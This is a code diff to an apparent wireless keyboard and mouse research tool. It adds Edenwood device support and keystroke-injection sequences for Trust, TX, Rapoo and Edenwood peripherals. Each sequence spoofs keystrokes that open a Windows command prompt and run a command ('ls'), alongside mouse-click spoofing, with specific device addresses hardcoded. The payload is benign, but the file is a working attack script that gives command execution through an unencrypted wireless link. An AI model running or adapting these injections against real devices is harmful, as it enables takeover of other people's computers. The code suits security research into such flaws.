@@ -27,14 +27,16 @@
 import time
 
 from lib import common
+from devices.keyboard import * 
+from devices.mouse import * 
 from devices.TLSR85.tlsr85_keyboard import Tlsr85_Keyboard
 from devices.TLSR85.tlsr85_mouse import Tlsr85_Mouse
 from devices.TX.tx_mouse import Tx_mouse
 from devices.TX.tx_keyboard import Tx_Keyboard
-from devices.keyboard import * 
-from devices.mouse import * 
-from devices.Rapoo.rapoo_mouse import *
-from devices.Rapoo.rapoo_keyboard import *
+from devices.Rapoo.rapoo_mouse import Rapoo_Mouse
+from devices.Rapoo.rapoo_keyboard import Rapoo_Keyboard
+from devices.Edenwood.edenwood_mouse import Edenwood_Mouse
+from devices.Edenwood.edenwood_keyboard import Edenwood_Keyboard
 
 
 common.init_args('./main.py')
@@ -52,15 +54,12 @@ trust_mouse = Tlsr85_Mouse("4a:b4:cb:dc", "aa:aa:aa:b5", 0x11021, 0x24bf)
 
 attack_tlsr85_keyboard = [
     trust_keyboard.build_packet(modifiers=[KeyboardModifiers.MODIFIER_GUI_LEFT]),
-    lambda: time.sleep(0.5),
-    trust_keyboard.build_packet([KeyboardScancode.KEY_C]),
-    trust_keyboard.build_packet([KeyboardScancode.KEY_M]),
-    trust_keyboard.build_packet([KeyboardScancode.KEY_D]),
-    lambda: time.sleep(0.5),
-    trust_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
     lambda: time.sleep(1),
-    trust_keyboard.build_packet([KeyboardScancode.KEY_L]),
-    trust_keyboard.build_packet([KeyboardScancode.KEY_S]),
+    trust_keyboard.build_packet([KeyboardScancode.KEY_C, KeyboardScancode.KEY_M, KeyboardScancode.KEY_D], modifiers=[KeyboardModifiers.MODIFIER_MULTIPLE_KEY]),
+    lambda: time.sleep(1),
+    trust_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
+    lambda: time.sleep(1.5),
+    trust_keyboard.build_packet([KeyboardScancode.KEY_L, KeyboardScancode.KEY_S], modifiers=[KeyboardModifiers.MODIFIER_MULTIPLE_KEY]),
     trust_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
     ]
 
@@ -79,15 +78,12 @@ tx_mouse = Tx_mouse("55:79:90:16", 0x11021, 0x6818)
 
 attack_tx_keyboard = [
     *tx_keyboard.build_packet(modifiers=[KeyboardModifiers.MODIFIER_GUI_LEFT]),
-    lambda: time.sleep(0.5),
-    *tx_keyboard.build_packet([KeyboardScancode.KEY_C]),
-    *tx_keyboard.build_packet([KeyboardScancode.KEY_M]),
-    *tx_keyboard.build_packet([KeyboardScancode.KEY_D]),
-    lambda: time.sleep(0.5),
-    *tx_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
     lambda: time.sleep(1),
-    *tx_keyboard.build_packet([KeyboardScancode.KEY_L]),
-    *tx_keyboard.build_packet([KeyboardScancode.KEY_S]),
+    *tx_keyboard.build_packet([KeyboardScancode.KEY_C, KeyboardScancode.KEY_M, KeyboardScancode.KEY_D]),
+    lambda: time.sleep(1),
+    *tx_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
+    lambda: time.sleep(1.5),
+    *tx_keyboard.build_packet([KeyboardScancode.KEY_L, KeyboardScancode.KEY_S]),
     *tx_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
     ]
 
@@ -108,14 +104,11 @@ rapoo_mouse = Rapoo_Mouse("c7:92:78:79", 0x11021, 0xefdf)
 attack_rapoo_keyboard = [
     rapoo_keyboard.build_packet([KeyboardScancode.KEY_LGUI]),
     lambda: time.sleep(1),
-    rapoo_keyboard.build_packet([KeyboardScancode.KEY_C]),
-    rapoo_keyboard.build_packet([KeyboardScancode.KEY_M]),
-    rapoo_keyboard.build_packet([KeyboardScancode.KEY_D]),
+    rapoo_keyboard.build_packet([KeyboardScancode.KEY_C, KeyboardScancode.KEY_M, KeyboardScancode.KEY_D]),
     lambda: time.sleep(1),
     rapoo_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
     lambda: time.sleep(1.5),
-    rapoo_keyboard.build_packet([KeyboardScancode.KEY_L]),
-    rapoo_keyboard.build_packet([KeyboardScancode.KEY_S]),
+    rapoo_keyboard.build_packet([KeyboardScancode.KEY_L, KeyboardScancode.KEY_S]),
     rapoo_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
     ]
 
@@ -128,3 +121,32 @@ attack_rapoo_mouse = [
 #rapoo_mouse.sniff()
 #rapoo_keyboard.spoof(attack_rapoo_keyboard)
 #rapoo_mouse.spoof(attack_rapoo_mouse)
+
+
+"""
+----------------------------Edenwood----------------------------
+"""
+
+edenwood_mouse = Edenwood_Mouse("55:2d:2c:bc", 0x11021, 0x6818)
+edenwood_keyboard = Edenwood_Keyboard("55:2d:2c:bc", 0x11021, 0x6818)
+
+#edenwood_keyboard.sniff()
+#edenwood_mouse.sniff()
+
+attack_edenwood_keyboard = [
+    edenwood_keyboard.build_packet([KeyboardScancode.KEY_LGUI]),
+    lambda: time.sleep(1),
+    edenwood_keyboard.build_packet([KeyboardScancode.KEY_C, KeyboardScancode.KEY_M, KeyboardScancode.KEY_D]),
+    lambda: time.sleep(1),
+    edenwood_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
+    lambda: time.sleep(1.5),
+    edenwood_keyboard.build_packet([KeyboardScancode.KEY_L, KeyboardScancode.KEY_S]),
+    edenwood_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
+]
+
+attack_edenwood_mouse = [
+    edenwood_mouse.build_packet([MouseClickType.LEFT_CLICK])
+]
+
+#edenwood_mouse.spoof(attack_edenwood_mouse)
+#edenwood_keyboard.spoof(attack_edenwood_keyboard) # not perfect, packet with same seq number might get repeated
